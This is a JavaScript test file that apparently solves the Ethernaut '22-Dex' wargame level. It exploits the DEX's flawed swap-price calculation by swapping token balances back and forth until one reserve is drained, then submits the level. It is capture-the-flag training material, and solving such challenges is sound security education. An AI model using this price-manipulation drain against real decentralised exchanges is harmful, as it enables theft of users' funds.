const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Dex");
  const challengeAddress = await createChallenge(`0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 22-Dex", async function () {
  const challenge = await getChallenge();

  const [eoa] = await ethers.getSigners();
  const address = await eoa.getAddress();

  const token1 = await challenge.token1();
  const token2 = await challenge.token2();

  // Approve dex to spend all our tokens.
  await challenge.approve(await challenge.getAddress(), 1000000);
  // Swap a few times then we can have enough tokens to drain the DEX.
  // user token1 = 0n
  // user token2 = 20n
  // user token1 = 24n
  // user token2 = 0n
  // user token1 = 0n
  // user token2 = 30n
  // user token1 = 41n
  // user token2 = 0n
  // user token1 = 0n
  // user token2 = 65n
  // Dex token1 = 110n
  // Dex token2 = 45n
  for (let i = 0; i < 2; ++i) {
    await challenge.swap(token1, token2, await challenge.balanceOf(token1, address));
    // console.log("user token1 =", await challenge.balanceOf(token1, address));
    // console.log("user token2 =", await challenge.balanceOf(token2, address));
    await challenge.swap(token2, token1, await challenge.balanceOf(token2, address));
    // console.log("user token1 =", await challenge.balanceOf(token1, address));
    // console.log("user token2 =", await challenge.balanceOf(token2, address));
  }
  await challenge.swap(token1, token2, await challenge.balanceOf(token1, address));
  // console.log("user token1 =", await challenge.balanceOf(token1, address));
  // console.log("user token2 =", await challenge.balanceOf(token2, address));
  const token1Remaining = await challenge.balanceOf(token1, await challenge.getAddress());
  const token2Remaining = await challenge.balanceOf(token2, await challenge.getAddress());
  // console.log("Dex token1 =", token1Remaining);
  // console.log("Dex token2 =", token2Remaining);
  await challenge.swap(token2, token1, token2Remaining);
  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
